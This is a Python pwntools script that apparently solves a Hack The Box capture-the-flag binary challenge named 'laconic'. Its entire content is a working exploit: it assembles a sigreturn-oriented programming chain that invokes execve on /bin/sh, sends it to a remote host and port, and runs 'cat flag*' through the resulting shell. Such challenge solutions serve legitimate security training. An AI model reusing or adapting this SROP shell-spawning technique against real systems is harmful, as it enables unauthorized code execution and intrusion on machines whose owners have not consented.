#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './laconic' 

LOCAL = False

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e = ELF(fname, checksec=False)
rop = ROP(e)

# Search for "/bin/sh" in the binary and restrict to a range
binsh = 0x43238

print('[*] Gadgets: \n\t\t'
  f'pop rax: {rop.rax[0]:#04x}\n\t\t'
  f'syscall: {rop.syscall[0]:#04x}\n\t\t'
  f'/bin/sh: {binsh:#04x}\n'
  )

# Srop
frame     = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = binsh           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = rop.syscall[0]

pl  = b'w3th4nds'
pl += p64(rop.rax[0])
pl += p64(0xf)
pl += p64(rop.syscall[0])
pl += bytes(frame)

r.sendline(pl)

print('[*] Sedning SROP chain..\n')
pause(1)
print('[+] Done!\n')
r.sendline('cat flag*')
print(f'Flag -> {r.recvline_contains("HTB").decode()}\n')